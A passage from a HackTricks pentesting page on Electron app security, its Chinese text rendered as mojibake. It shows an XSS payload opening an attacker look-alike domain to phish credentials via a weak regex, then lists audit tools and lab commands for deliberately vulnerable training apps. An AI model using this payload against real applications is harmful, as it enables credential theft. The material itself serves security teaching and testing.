<p>å¦‚æœè¯¥å‡½æ•°ä½¿ç”¨çš„ <strong>regex</strong> <strong>æ˜“å—ç»•è¿‡æ”»å‡»</strong>ï¼ˆä¾‹å¦‚ <strong>æœªè½¬ä¹‰å­åŸŸçš„ç‚¹</strong>ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ XSS <strong>æ‰“å¼€ä¸€ä¸ªæ–°çª—å£</strong>ï¼Œè¯¥çª—å£ä½äºæ”»å‡»è€…çš„åŸºç¡€è®¾æ–½ä¸­ <strong>è¯·æ±‚ç”¨æˆ·å‡­æ®</strong>ï¼š</p>
<pre><code class="language-html">&lt;script&gt;
window.open("&lt;http://subdomainagoogleq.com/index.html&gt;")
&lt;/script&gt;
</code></pre>
<h2 id="å·¥å…·"><a class="header" href="#å·¥å…·"><strong>å·¥å…·</strong></a></h2>
<ul>
<li><a href="https://github.com/doyensec/electronegativity"><strong>Electronegativity</strong></a> æ˜¯ä¸€ä¸ªç”¨äºè¯†åˆ«åŸºäº Electron çš„åº”ç”¨ç¨‹åºä¸­çš„é”™è¯¯é…ç½®å’Œå®‰å…¨åæ¨¡å¼çš„å·¥å…·ã€‚</li>
<li><a href="https://github.com/ksdmitrieva/electrolint"><strong>Electrolint</strong></a> æ˜¯ä¸€ä¸ªå¼€æºçš„ VS Code æ’ä»¶ï¼Œç”¨äº Electron åº”ç”¨ç¨‹åºï¼Œä½¿ç”¨ Electronegativityã€‚</li>
<li><a href="https://github.com/ajinabraham/nodejsscan"><strong>nodejsscan</strong></a> ç”¨äºæ£€æŸ¥æ˜“å—æ”»å‡»çš„ç¬¬ä¸‰æ–¹åº“</li>
<li><a href="https://electro.ng/"><strong>Electro.ng</strong></a>: ä½ éœ€è¦è´­ä¹°å®ƒ</li>
</ul>
<h2 id="å®éªŒå®¤"><a class="header" href="#å®éªŒå®¤">å®éªŒå®¤</a></h2>
<p>åœ¨ <a href="https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s">https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s</a> ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨æ˜“å—æ”»å‡»çš„ Electron åº”ç”¨ç¨‹åºçš„å®éªŒå®¤ã€‚</p>
<p>ä¸€äº›å°†å¸®åŠ©ä½ å®Œæˆå®éªŒå®¤çš„å‘½ä»¤ï¼š</p>
<pre><code class="language-bash"># Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
</code></pre>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®"><strong>å‚è€ƒæ–‡çŒ®</strong></a></h2>
<ul>
<li><a href="https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028">https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028</a></li>
<li><a href="https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d">https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d</a></li>
<li><a href="https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8">https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8</a></li>
<li><a href="https://www.youtube.com/watch?v=a-YnG3Mx-Tg">https://www.youtube.com/watch?v=a-YnG3Mx-Tg</a></li>
<li><a href="https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s">https://www.youtube.com/watch?v=xILfQGkLXQo&amp;t=22s</a></li>
<li>æ›´å¤šå…³äºElectronå®‰å…¨çš„ç ”ç©¶å’Œæ–‡ç« åœ¨ <a href="https://github.com/doyensec/awesome-electronjs-hacking">https://github.com/doyensec/awesome-electronjs-hacking</a></li>
<li><a href="https://www.youtube.com/watch?v=Tzo8ucHA5xw&amp;list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&amp;index=81">https://www.youtube.com/watch?v=Tzo8ucHA5xw&amp;list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&amp;index=81</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>æˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../network-services-pentesting/pentesting-web/drupal/drupal-rce.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../network-services-pentesting/pentesting-web/drupal/drupal-rce.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
